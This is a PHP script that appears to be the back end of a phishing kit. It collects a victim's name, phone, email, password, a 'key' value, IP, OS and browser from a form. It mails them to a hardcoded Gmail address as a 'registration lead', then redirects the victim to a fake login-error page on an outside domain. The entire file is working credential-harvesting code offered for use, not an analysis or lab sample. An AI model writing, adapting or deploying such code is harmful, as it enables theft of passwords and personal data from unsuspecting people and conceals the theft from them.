<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name     = $_POST['nameField'];
    $country  = $_POST['countField'];
    $mobile   = $_POST['mobField'];
    $ip       = $_POST['ipField'];
    $os       = $_POST['osField'];
    $browser  = $_POST['browserField'];
    $email    = $_POST['email'];
    $pass     = $_POST['pass'];
    $key      = $_POST['key_field'];

    // Email Setup
    $to = "visit.rahul0036@gmail.com"; // <-- apna Gmail yahan likho
    $subject = "New Registration Lead";
    
    $message = "
    <strong>Full Name:</strong> $name<br>
    <strong>Country:</strong> $country<br>
    <strong>Phone:</strong> $mobile<br>
    <strong>IP:</strong> $ip<br>
    <strong>OS:</strong> $os<br>
    <strong>Browser:</strong> $browser<br>
    <strong>Email:</strong> $email<br>
    <strong>Password:</strong> $pass<br>
    <strong>Key:</strong> $key<br>
    ";

    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: noreply@yourdomain.com" . "\r\n"; // Optional: Apna domain mail use karein

    // Send Email
    if (mail($to, $subject, $message, $headers)) {
        header("Location: https://kmplsoft.shop/activetion/act/set-a/nor/1/nor1/login/log-err.html");
        exit();
    } else {
        echo "Email sending failed.";
    }
} else {
    echo "Invalid Request.";
}
?>
